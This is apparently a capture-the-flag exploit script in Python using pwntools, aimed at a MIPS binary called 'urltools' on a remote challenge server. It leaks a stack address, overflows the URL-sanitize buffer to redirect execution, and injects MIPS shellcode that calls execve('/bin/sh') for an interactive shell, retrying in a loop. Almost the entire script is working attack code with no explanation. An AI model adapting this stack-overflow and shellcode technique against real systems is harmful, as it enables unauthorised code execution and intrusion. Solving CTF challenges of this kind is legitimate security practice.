from pwn import *
import pwn
import base64 as b64
import random as rnd
import struct as st
import re
import subprocess
from time import sleep
import pwnlib.qemu

context(arch="mips",
        word_size=32,
        endian="little",
        os="linux")

file = "./urltools"
exe_args = []
io: process = None
PREFIX = b">> "

speed = 0.2

speed = 0.1

def launch_remote():
    global file, io
    io = remote(host="chal.competitivecyber.club", port=5001)

def launch_local():
    global file, io
    if args.GDB:
        io = gdb.debug([file, *exe_args], gdbscript=
        """
        
        """)
        input("debug")
    else:
        io = process([file, *exe_args])

def solve_pow():
    leak = recvu(b"===================")
    pow = getb(leak, b") solve ", b"\n").decode()
    proc = subprocess.Popen(["solvepow", "solve", pow], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
    pow = proc.communicate()[0]
    sla(b"Solution? ", pow)

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: io.sendlineafter(a, b)
sa = lambda a, b: io.sendafter(a, b)
sl = lambda a: io.sendline(a)
recv = lambda: io.recv()
recvn = lambda a: io.recvn(a)
recvu = lambda a, b=False: io.recvuntil(a, b)
safe_link = lambda addr, ptr: (addr >> 12) ^ ptr
binsh = lambda: next(libc.search(b"/bin/sh\0"))
snum = lambda a, b: sla(a, str(b).encode("iso-8859-1"))
sprefix = lambda a: sla(PREFIX, a)
choice = lambda a: snum(PREFIX, a)

def launch():
    if args.REMOTE:
        l = launch_remote
    else:
        l = launch_local
    with context.local(log_level=logging.ERROR):
        l()
    if args.POW:
        solve_pow()

def getb(d, a, b):
    a_ = d.find(a)
    if a_ == -1 or a == b"": a_ = 0
    b_ = d.find(b, a_+len(a))
    if b_ == -1 or b == b"": b_ = len(d)
    return d[a_+len(a):b_]


#
# exploit goes here
#

with context.local(log_level=logging.ERROR):
    exe = ELF(file)
    # libc = ELF("./libc.so.6")

tries = -1
tries_prog = log.progress("Tries")
def exploit():
    def sanitize(url):
        choice(1)
        sprefix(url)
    def tld(data):
        choice(2)
        sprefix(data)
    
    # sanitize(b"."*0x1d + b"A" + p32(0x400f30))
    # io.interactive()

    tld(b"A"*(0x23))
    leak = recvu(b"1. Sanitize URL")
    leak = getb(leak, b"Your TLD is ", b"\n\n1. Sanitize URL")
    print(leak.hex(" "))
    # raise EOFError
    stack = u32(leak)
    success("stack: %#010x" % stack)

    # stack = 0x407ffe94
    stack += tries*4

    binsh_addr = stack + 4 + 0x18

    shellcode = asm(
f"""
lui $a0, {binsh_addr >> 16}
ori $a0, $a0, {binsh_addr & 0xffff}

move $a1, $zero
move $a2, $zero
li $v0, 0xfab
syscall
""")
    # print(shellcode.hex(" "))

    sanitize(b"."*0x1d + b"A" + p32(stack + 4))
    
    sprefix(b"\0"*4 + shellcode + b"/bin/sh\0")

    choice(3)
    sl(b"id")
    io.recv(timeout=0.1)
    io.recv(timeout=0.1)
    io.recv(timeout=0.1)

    io.interactive()
    input("end")
    # exit()

# launch()
# exploit()
# exit()

while True:
    count = 0
    tries += 1
    tries_prog.status(str(tries))

    launch()
    try:
        exploit()
    except EOFError:
        pass

    with context.local(log_level=logging.ERROR):
        io.close()
    # sleep(0.05)